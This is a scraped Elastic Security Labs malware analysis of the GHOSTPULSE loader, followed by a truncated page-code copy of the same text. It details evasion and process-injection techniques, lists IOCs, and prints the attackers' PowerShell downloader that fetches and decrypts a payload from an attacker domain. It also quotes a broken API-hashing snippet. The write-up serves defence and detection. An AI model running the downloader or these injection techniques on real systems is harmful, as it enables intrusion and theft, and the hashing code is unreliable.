InLoadOrderModuleList structure](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png)\n\nNext, GHOSTPULSE builds an Import Address Table (IAT) incorporating essential APIs. This operation involves parsing the *InLoadOrderModuleList* structure within the Process Environment Block (PEB).\n\n![Stage 1 hashing algorithm](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png)\n\n``` python\n# Python code used for API hashing\ndef calculate_api_name_hash(api_name):\n    value = 0\n    for char in input_string:\n        total = (ord(char) + value *0x1003F)\u00260xFFFFFFFF\n    return value \n```\n        \nBelow is the Stage 1 IAT structure reconstructed from the GHOSTPULSE malware sample, provided for reference:\n\n``` c\nstruct core_stage1_IAT\n{\nvoid *kernel32_LoadLibraryW;\nvoid *kernel32_QueryPerformanceCounter;\nvoid *ntdll_module;\nvoid *kernel32_CloseHandle;\n__int64 field_20;\n__int64 field_28;\n__int64 field_30;\n__int64 field_38;\nvoid *kernel32_GetTempPathW;\nvoid *kernel32_GetModuleFileNameW;\n__int64 field_50;\n__int64 field_58;\n__int64 field_60;\nvoid *ntdll__swprintf;\n__int64 field_70;\n__int64 field_78;\n__int64 (__fastcall *ntdll_RtlDecompressBuffer)(__int64, __int64, _QWORD, __int64, int, int *);\nvoid *kernel32_CreateFileW;\nvoid *kernel32_ReadFile;\nvoid *ntdll_NtQueryInformationProcess;\nvoid *kernel32_GetFileSize;\n__int64 field_A8;\nvoid *kernel32_module;\n__int64 field_B8;\nvoid *ntdll_NtDelayExecution;\n__int64 (__fastcall *kernel32_GlobalAlloc)(__int64, __int64);\n__int64 field_D0;\nvoid *kernel32_GlobalFree;\n__int64 field_E0;\nvoid *ntdll_RtlQueryEnvironmentVariable_U;\n};\n```\n\nIt then proceeds with its operation by reading and parsing the file named `handoff.wav` from the current directory. This file contains an encrypted data blob divided into distinct chunks. Each chunk of data is positioned following the string IDAT. The parsing process involves the malware executing through two distinct steps.\n\n![Reading and decrypting the encrypted file](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image14.png)\n\nThe initial phase involves identifying the commencement of the encrypted data by searching for the IDAT string in the file, which is followed by a distinctive 4-byte tag value. If the tag corresponds to the value stored in the malware's configuration, the malware extracts the bytes of the encrypted blob. The initial structure is as follows:\n\n``` c\nstruct initial_idat_chunk\n{\n  DWORD size_of_chunk;\n  DWORD IDAT_string;\n  DWORD tag;\n  DWORD xor_key;\n  DWORD size_of_encrypted_blob;\n  _BYTE first_chunk[];\n};\n```\n    \n- **size_of_chunk**: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT. \n- **xor_key**: A 4-byte long XOR key employed for decrypting the consolidated encrypted blob after extraction\n- **size_of_encrypted_blob**: Denotes the overall size of the encrypted blob, which is stored in chunks within the file \n- **first_chunk**: Marks the start of the first chunk of data in memory\n \n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image2.png)\n\nIn the second step, the malware locates the next occurrence of IDAT and proceeds to extract the encrypted chunks that follow it which has the following format: \n\n``` c\nstruct next_idat_chunk\n{\nDWORD size_of_chunk;\nDWORD IDAT_string;\n_BYTE n_chunk[];\n};\n```\n\n- **size_of_chunk**: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT. \n- **n_chunk**: Marks the start of the chunk of data in memory\n\nThe malware continues extracting encrypted data chunks until it reaches the specified size_of_encrypted_blob. Subsequently, the malware proceeds to decrypt the data using the 4-byte XOR key *xor_key*.\n\nAt this stage, the data blob, which is already compressed, undergoes decompression by the malware. The decompression process utilizes the `RtlDecompressBuffer` api.\n\n![Decompression using the RtlDecompressBuffer API](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image1.png)\n \nThe malware proceeds by loading a specified library stored in its configuration, in this case, `mshtml.dll`, utilizing the *LoadLibraryW* function. Shellcode (Stage 2) contained inside the decrypted and decompressed blob of data is written to the .text section of the freshly loaded DLL and then executed.\n\nThis technique is known as “module stomping”. The following image shows the associated *VirtualProtect* API calls captured with [Elastic Defend](https://www.elastic.co/guide/en/security/current/install-endpoint.html) associated with the module stomping:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image4.png)\n \n### Stage 2\n\nStage 2 initiates by constructing a new IAT structure and utilizing the CRC32 algorithm as the API name hashing mechanism.\nThe following is the IAT structure of stage 2:\n\n``` c\nstruct core_stage2_IAT\n{\n  void *kernel32_module;\n  void *ntdll_module;\n  void *kernel32_CreateFileW;\n  void *kernel32_WriteFile;\n  void *kernel32_ReadFile;\n  void *kernel32_SetFilePointer;\n  void *kernel32_CloseHandle;\n  void *kernel32_GlobalAlloc;\n  void *kernel32_GlobalFree;\n  void *kernel32_ExpandEnvironmentStringsW;\n  void *kernel32_GetFileSize;\n  void *kernel32_GetProcAddress;\n  void *kernel32_LoadLibraryW;\n  void *ntdll__swprintf;\n  void *kernel32_QueryPerformanceCounter;\n  void *ntdll_RtlDecompressBuffer;\n  void *field_80;\n  void *field_88;\n  void *field_90;\n  void *field_98;\n  void *field_A0;\n  void *ntdll_NtDelayExecution;\n  void *ntdll_RtlRandom;\n  void *kernel32_GetModuleFileNameW;\n  void *kernel32_GetCommandLineW;\n  void *field_C8;\n  void *ntdll_sscanf;\n  void *field_D8;\n  void *ntdll_NtQueryInformationProcess;\n  void *ntdll_NtQuerySystemInformation;\n  void *kernel32_CreateDirectoryW;\n  void *kernel32_CopyFileW;\n  void *ntdll_NtClose;\n  void *field_108;\n  void *field_110;\n  void *field_118;\n  void *field_120;\n  void *field_128;\n  void *kernel32_SetCurrentDirectoryW;\n  void *field_138;\n  void *kernel32_SetEnvironmentVariableW;\n  void *kernel32_CreateProcessW;\n  void *kernel32_GetFileAttributesW;\n  void *msvcrt_malloc;\n  void *msvcrt_realloc;\n  void *msvcrt_free;\n  void *ntdll_RtlHashUnicodeString;\n  void *field_178;\n  void *field_180;\n  void *kernel32_OpenMutexA;\n  void *field_190;\n  void *kernel32_VirtualProtect;\n  void *kernel32_FlushInstructionCache;\n  void *field_1A8;\n  void *ntdll_NtOpenProcessToken;\n  void *ntdll_NtQueryInformationToken;\n  void *ntdll_RtlWalkFrameChain;\n  void *field_1C8;\n  void *addr_temp_file_content;\n  void *addr_decrypted_file;\n};\n```\n\nConcerning NT functions, the malware reads the ntdll.dll library from disk and writes it to a dynamically allocated memory space with read, write, and execute permissions. Subsequently, it parses the loaded `ntdll.dll` library to extract the offsets of the required NT functions. These offsets are then stored within the newly built IAT structure. When the malware necessitates the execution of an NT API, it adds the API offset to the base address of `ntdll.dll` and directly invokes the API. Given that NT APIs operate at a very low level, they execute syscalls directly, which does not require the `ntdll.dll` library to be loaded in memory using the LoadLibrary API, this is done to evade userland hooks set by security products.\n\nThe following is the structure used by the malware to store NT API offsets:\n\n``` c\nstruct __unaligned __declspec(align(4)) core_stage2_nt_offsets_table\n{\n  __int64 ntdll_module;\n  int ZwCreateSection;\n  int ZwMapViewOfSection;\n  int ZwWriteVirtualMemory;\n  int ZwProtectVirtualMemory;\n  int NtSuspendThread;\n  int ZwResumeThread;\n  int ZwOpenProcess;\n  int ZwGetContextThread;\n  int NtSetContextThread;\n};\n```\n\nGHOSTPULSE has the ability to establish persistence, if configured to, by generating an `.lnk` file that points to the Stage 1 binary, denoted as `VBoxSVC.exe`. To achieve this, the malware leverages COM (Component Object Model) objects as part of its technique.\n\n![Persistence executed according to the configuration flag](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image6.png)\n \nIt extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value `0xA1B2D3B4`. Finally, the encrypted data is saved to a file in the user's temporary folder.\nIt extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value `0xA1B2D3B4`. Finally, the encrypted data is saved to a file in the user's temporary folder.\n\nThe malware then initiates a suspended child process using the executable specified in the Stage 2 configuration, which is a 32-bit `cmd.exe` in this case. It then adds an environment variable to the child process with a random name, example: `GFHZNIOWWLVYTESHRTGAVC`, pointing to the previously created temporary file. \n\nFurther, the malware proceeds by creating a section object and mapping a view of it to `mshtml.dll` in the child process using the `ZwCreateSection` and `ZwMapViewOfSection` APIs.\n\nThe legitimate `mshtml.dll` code is overwritten with the *WriteProcessMemory* API. The primary thread’s execution is then redirected to the malicious code in `mshtml.dll` with the *Wow64SetThreadContext* API as shown in the following image:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image12.png)\n \nThe parent process promptly terminates itself.\n\n### Stage 3\n\nThe objective of GHOSTPULSE’s Stage 3 is to load and execute the final payload in another  process. One interesting part of Stage 3 was that it overwrites its previously executed instructions with new instructions to make analysis difficult. It is also capable of establishing persistence using the same method described above. GHOSTPULSE executes NTDLL APIs using the \"[heaven’s gate](https://www.zdnet.com/article/malware-authors-are-still-abusing-the-heavens-gate-technique/)\" technique.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image9.png)\n\nStage 3 starts off by constructing its own Function Import Table using CRC32 as the hashing algorithm. Additionally, it has the capability to disable redirection of the file system to WOW64, achieved through the utilization of the procedure `Wow64FsRedirection`, if configured to do so.\n\nFollowing this, Stage 3 accesses the environment variable that was set earlier, in our case `GFHZNIOWWLVYTESHRTGAVC`, retrieves the associated temporary file and proceeds to decrypt its contents.\n\n![Decrypting the temp file using the computer name and a hardcoded value](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image15.png)\n\nThe decrypted file includes both a configuration and the ultimate payload in an encrypted format. The final payload undergoes XOR decryption using a 200-byte long key stored within the configuration. The malware then parses the PE structure of the payload with a set of functions that will indicate how the payload will be injected, for example, the type of payload (DLL or executable) architecture, etc.\n\n![Decrypting the final payload](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image3.png)\n\nGHOSTPULSE employs [Process Doppelgänging](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack), leveraging the NTFS transactions feature to inject the final payload into a new child process. The following steps illustrate the process:\n\n- Calls the `CreateTransaction` API to initial a transaction\n- Creates a transaction file with a random file name in temp folder with the `ZwCreateFile` API\n- Writes the payload to the temp file using the `ZwWriteFile` API\n- Creates a section of the transaction file with `ZwCreateSection` API\n- At this point the file is not needed anymore, the malware calls the `RollbackTransaction` API to roll the transaction back\n- GHOSTPULSE creates a suspended process with the target process path taken from it's configuration, in our sample `1msbuild.exe1`\n- It maps a view of the section to the process with the `ZwMapViewOfSection` API\n- It sets the child process thread instruction pointer to the entry point of the final payload with the `NtSetContextThread` API\n- Finally it resumes the thread with the `NtResumeThread` API\n\n![Functions used to execute process doppelgänging technique](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image8.png)\n\n### Final Payload\n\nThe final payload varies from sample to sample but is typically an information stealer. We have observed SectopRAT, Rhadamanthys, Vidar, Lumma, and NetSupport as final payloads. In SectopRAT samples, the malware first reaches out to Pastebin to retrieve the command and control address. In this case, it was `195.201.198[.]179` over TCP port `15647` as shown below:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image7.jpg)\n\n## Configuration extractor\n\nAlongside this research, the Elastic Security Research Team has provided a [configuration extractor](https://github.com/elastic/labs-releases/blob/main/tools/ghostpulse/ghostpulse_payload_extractor.py) to allow threat researchers to continue work to discover further developments within this campaign and expand detection capabilities for our community. The extractor takes the encrypted file shipped with GHOSTPULSE as the input.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image16.png)\n\n## Detection Guidance\n\nElastic Defend detects this threat with the following [behavior protection rules](https://github.com/elastic/protections-artifacts/tree/main/behavior):\n\n- DNS Query to Suspicious Top Level Domain\n- Library Load of a File Written by a Signed Binary Proxy\n- Suspicious API Call from an Unsigned DLL\n- Suspicious Memory Write to a Remote Process\n- Process Creation from Modified NTDLL\n\nThe following yara rule will also detect GHOSTPULSE loaders on disk:\n\n- [Windows.Trojan.GhostPulse](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GhostPulse.yar)\n\n## Observations\n \nAll observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/ghostpulse) in both ECS and STIX format.\n\nThe following observables were discussed in this research.\n\n| Observable                                                       | Type        | Name            | Reference                   |\n|------------------------------------------------------------------|-------------|-----------------|-----------------------------|\n| 78.24.180[.]93                                                   | ip-v4       |                 | Stage 0 C2 IP               |\n| manojsinghnegi[.]com                                             | domain-name |                 | Stage 0 C2 domain           |\n| manojsinghnegi[.]com/2.tar.gpg                                   | url         |                 | Stage 0 C2 URL              |\n| 0c01324555494c35c6bbd8babd09527bfc49a2599946f3540bb3380d7bec7a20 | sha256      | Chrome-x64.msix | Malicious MSIX              |\n| ee4c788dd4a173241b60d4830db128206dcfb68e79c68796627c6d6355c1d1b8 | sha256      | Brave-x64.msix  | Malicious MSIX              |\n| 4283563324c083f243cf9335662ecc9f1ae102d619302c79095240f969d9d356 | sha256      | Webex.msix      | Malicious MSIX              |\n| eb2addefd7538cbd6c8eb42b70cafe82ff2a8210e885537cd94d410937681c61 | sha256      | new1109.ps1     | PowerShell Downloader       |\n| 49e6a11453786ef9e396a9b84aeb8632f395477abc38f1862e44427982e8c7a9 | sha256      | 38190626900.rar | GHOSTPULSE tar archive      |\n| Futurity Designs Ltd                                             | Code signer |                 | Chrome-x64.msix code signer |\n| Fodere Titanium Limited                                          | Code signer |                 | Brave-x64.msix code signer  |\n| IMPERIOUS TECHNOLOGIES LIMITED                                   | Code signer |                 | Webex.msix code signer      |\n\n## References\n\n- [https://twitter.com/1ZRR4H/status/1699923793077055821](https://twitter.com/1ZRR4H/status/1699923793077055821)\n- [https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/](https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/)\n- [https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates](https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates)\n","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),w=(i,e)=\u003e{for(var n in e)a(i,n,{get:e[n],enumerable:!0})},o=(i,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of p(e))!m.call(i,r)\u0026\u0026r!==n\u0026\u0026a(i,r,{get:()=\u003ee[r],enumerable:!(s=u(e,r))||s.enumerable});return i};var b=(i,e,n)=\u003e(n=i!=null?h(g(i)):{},o(e||!i||!i.__esModule?a(n,\"default\",{value:i,enumerable:!0}):n,i)),v=i=\u003eo(a({},\"__esModule\",{value:!0}),i);var d=f((x,l)=\u003e{l.exports=_jsx_runtime});var S={};w(S,{default:()=\u003ek,frontmatter:()=\u003ey});var t=b(d()),y={title:\"GHOSTPULSE haunts victims using defense evasion bag o' tricks\",slug:\"ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks\",date:\"2023-10-27\",description:\"Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables.\",author:[{slug:\"salim-bitam\"},{slug:\"joe-desimone\"}],image:\"photo-edited-05@2x.jpg\",category:[{slug:\"attack-pattern\"},{slug:\"malware-analysis\"}],tags:[\"ghostpulse\",\"ref8207\"]};function c(i){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",img:\"img\",h3:\"h3\",code:\"code\",ul:\"ul\",li:\"li\",pre:\"pre\",em:\"em\",strong:\"strong\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},i.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:\"update\",children:\"Update\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In October 2024, we released an update to stage 2 of GHOSTPULSE that includes new evasion techniques. You can check it out \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/tricks-and-treats\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"preamble\",children:\"Preamble\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Elastic Security Labs has observed a campaign to compromise users with signed \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/msix/overview\",rel:\"nofollow\",children:\"MSIX\"}),\" application packages to gain initial access. The campaign leverages a stealthy loader we call GHOSTPULSE which decrypts and injects its final payload to evade detection.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"MSIX is a Windows app package format that developers can leverage to package, distribute, and install their applications to Windows users. With \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/msix/app-installer/app-installer-root\",rel:\"nofollow\",children:\"App Installer\"}),\", MSIX packages can be installed with a double click. This makes them a potential target for adversaries looking to compromise unsuspecting victims. However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"In a common attack scenario, we suspect the users are directed to download malicious MSIX packages through \",(0,t.jsx)(e.a,{href:\"https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates\",rel:\"nofollow\",children:\"compromised websites\"}),\", search-engine optimization (SEO) techniques, or malvertising. The masquerading themes we\\u2019ve observed include installers for Chrome, Brave, Edge, Grammarly, and WebEx to highlight a few.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image5.png\",alt:\"\",width:\"666\",height:\"427\"})}),`\n`,(0,t.jsx)(e.p,{children:\"From the user's perspective, the \\u201CInstall\\u201D button appears to function as intended. No pop-ups or warnings are presented. However, a PowerShell script is covertly used to download, decrypt, and execute GHOSTPULSE on the system.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image10.jpg\",alt:\"\",width:\"1440\",height:\"648\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"malware-analysis\",children:\"Malware Analysis\"}),`\n`,(0,t.jsx)(e.p,{children:\"The GHOSTPULSE loader can be broken down into 3 stages (sometimes preceded by a PowerShell script) used to execute a final payload.\"}),`\n`,(0,t.jsx)(e.h3,{id:\"stage-0\",children:\"Stage 0\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"We consider the PowerShell script dropped by the malicious MSIX installer to be the stage 0 payload. The PowerShell script is typically included in MSIX infection vectors, but not always in other GHOSTPULSE infection methods (MSI, EXE, ISO). In one sample, the PowerShell script downloads a GPG-encrypted file from \",(0,t.jsx)(e.code,{children:\"manojsinghnegi[.]com/2.tar.gpg\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Next, the PowerShell script decrypts the file using the command-line GPG utility using the following parameters:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"putin\"}),\" - the passphrase for the GPG file\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"--batch\"}),\" - execute GPG in non-interactive mode\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"--yes\"}),\" - answer \\u201Cyes\\u201D to any prompts\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"--passphrase-fd 0\"}),\" - read the passphrase from a file descriptor, 0 instructs GPG to use STDIN, which is putin\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"--decrypt\"}),\" - decrypt a file\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"--output\"}),\" - what to save the decrypted file as\"]}),`\n`]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`# 1\n$url = \"https://manojsinghnegi[.]com/2.tar.gpg\"\n$outputPath = \"$env:APPDATA\\\\$xxx.gpg\"\nInvoke-WebRequest -Uri $url -OutFile $outputPath\n\n# 1\necho 'putin' | .$env:APPDATA\\\\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\\\\$xxx.rar $env:APPDATA\\\\$xxx.gpg\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"The GPG utility is included in the malicious MSIX installer package.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The decrypted file is a tar archive containing an executable \",(0,t.jsx)(e.code,{children:\"VBoxSVC.exe\"}),\" which is in reality a renamed signed \",(0,t.jsx)(e.code,{children:\"gup.exe\"}),\" executable that is used to update Notepad++, which is vulnerable to sideloading, an encrypted file in one example \",(0,t.jsx)(e.code,{children:\"handoff.wav\"}),\" and a mostly benign library \",(0,t.jsx)(e.code,{children:\"libcurl.dll\"}),\" with one of its functions overwritten with malicious code. The PowerShell executes the binary \",(0,t.jsx)(e.code,{children:\"VBoxSVC.exe\"}),\" that will side load from the current directory the malicious DLL \",(0,t.jsx)(e.code,{children:\"libcurl.dll\"}),\". By minimizing the on-disk footprint of encrypted malicious code, the threat actor is able to evade file-based AV and ML scanning.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image11.png\",alt:\"File metadata of VBoxSVC.bin\",width:\"808\",height:\"499\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"stage-1\",children:\"Stage 1\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The first stage of GHOSTPULSE is embedded within a malicious DLL that undergoes side-loading through a benign executable. Execution of the corresponding code is triggered during the \",(0,t.jsx)(e.em,{children:\"DllEntryPoint\"}),\" phase.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The process is initiated by pinpointing the base address of the malicious DLL of \",(0,t.jsx)(e.code,{children:\"libcurl.dll\"}),\", achieved through parsing the \",(0,t.jsx)(e.em,{children:\"InLoadOrderModuleList\"}),\" API. This list, residing in the Process Environment Block (PEB), systematically records information about loaded modules.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png\",alt:\"Parsing the InLoadOrderModuleList structure\",width:\"871\",height:\"470\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Next, GHOSTPULSE builds an Import Address Table (IAT) incorporating essential APIs. This operation involves parsing the \",(0,t.jsx)(e.em,{children:\"InLoadOrderModuleList\"}),\" structure within the Process Environment Block (PEB).\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png\",alt:\"Stage 1 hashing algorithm\",width:\"871\",height:\"470\"})}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-python\",children:`# Python code used for API hashing\ndef calculate_api_name_hash(api_name):\n    value = 0\n    for char in input_string:\n        total = (ord(char) + value *0x1003F)\u00260xFFFFFFFF\n    return value \n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Below is the Stage 1 IAT structure reconstructed from the GHOSTPULSE malware sample, provided for reference:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-c\",children:`struct core_stage1_IAT\n{\nvoid *kernel32_LoadLibraryW;\nvoid *kernel32_QueryPerformanceCounter;\nvoid *ntdll_module;\nvoid *kernel32_CloseHandle;\n__int64 field_20;\n__int64 field_28;\n__int64 field_30;\n__int64 field_38;\nvoid *kernel32_GetTempPathW;\nvoid *kernel32_GetModuleFileNameW;\n__int64 field_50;\n__int64 field_58;\n__int64 field_60;\nvoid *ntdll__swprintf;\n__int64 field_70;\n__int64 field_78;\n__int64 (__fastcall *ntdll_RtlDecompressBuffer)(__int64, __int64, _QWORD, __int64, int, int *);\nvoid *kernel32_CreateFileW;\nvoid *kernel32_ReadFile;\nvoid *ntdll_NtQueryInformationProcess;\nvoid *kernel32_GetFileSize;\n__int64 field_A8;\nvoid *kernel32_module;\n__int64 field_B8;\nvoid *ntdll_NtDelayExecution;\n__int64 (__fastcall *kernel32_GlobalAlloc)(__int64, __int64);\n__int64 field_D0;\nvoid *kernel32_GlobalFree;\n__int64 field_E0;\nvoid *ntdll_RtlQueryEnvironmentVariable_U;\n};\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"It then proceeds with its operation by reading and parsing the file named \",(0,t.jsx)(e.code,{children:\"handoff.wav\"}),\" from the current directory. This file contains an encrypted data blob divided into distinct chunks. Each chunk of data is positioned following the string IDAT. The parsing process involves the malware executing through two distinct steps.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image14.png\",alt:\"Reading and decrypting the encrypted file\",width:\"1059\",height:\"187\"})}),`\n`,(0,t.jsx)(e.p,{children:\"The initial phase involves identifying the commencement of the encrypted data by searching for the IDAT string in the file, which is followed by a distinctive 4-byte tag value. If the tag corresponds to the value stored in the malware's configuration, the malware extracts the bytes of the encrypted blob. The initial structure is as follows:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-c\",children:`struct initial_idat_chunk\n{\n  DWORD size_of_chunk;\n  DWORD IDAT_string;\n  DWORD tag;\n  DWORD xor_key;\n  DWORD size_of_encrypted_blob;\n  _BYTE first_chunk[];\n};\n`})}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"size_of_chunk\"}),\": The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"xor_key\"}),\": A 4-byte long XOR key employed for decrypting the consolidated encrypted blob after extraction\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"size_of_encrypted_blob\"}),\": Denotes the overall size of the encrypted blob, which is stored in chunks within the file\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"first_chunk\"}),\": Marks the start of the first chunk of data in memory\"]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image2.png\",alt:\"\",width:\"843\",height:\"446\"})}),`\n`,(0,t.jsx)(e.p,{children:\"In the second step, the malware locates the next occurrence of IDAT and proceeds to extract the encrypted chunks that follow it which has the following format:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-c\",children:`struct next_idat_chunk\n{\nDWORD size_of_chunk;\nDWORD IDAT_string;\n_BYTE n_chunk[];\n};\n`})}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"size_of_chunk\"}),\": The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"n_chunk\"}),\": Marks the start of the chunk of data in memory\"]}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The malware continues extracting encrypted data chunks until it reaches the specified size_of_encrypted_blob. Subsequently, the malware proceeds to decrypt the data using the 4-byte XOR key \",(0,t.jsx)(e.em,{children:\"xor_key\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"At this stage, the data blob, which is already compressed, undergoes decompression by the malware. The decompression process utilizes the \",(0,t.jsx)(e.code,{children:\"RtlDecompressBuffer\"}),\" api.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image1.png\",alt:\"Decompression using the RtlDecompressBuffer API\",width:\"641\",height:\"142\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The malware proceeds by loading a specified library stored in its configuration, in this case, \",(0,t.jsx)(e.code,{children:\"mshtml.dll\"}),\", utilizing the \",(0,t.jsx)(e.em,{children:\"LoadLibraryW\"}),\" function. Shellcode (Stage 2) contained inside the decrypted and decompressed blob of data is written to the .text section of the freshly loaded DLL and then executed.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"This technique is known as \\u201Cmodule stomping\\u201D. The following image shows the associated \",(0,t.jsx)(e.em,{children:\"VirtualProtect\"}),\" API calls captured with \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/install-endpoint.html\",rel:\"nofollow\",children:\"Elastic Defend\"}),\" associated with the module 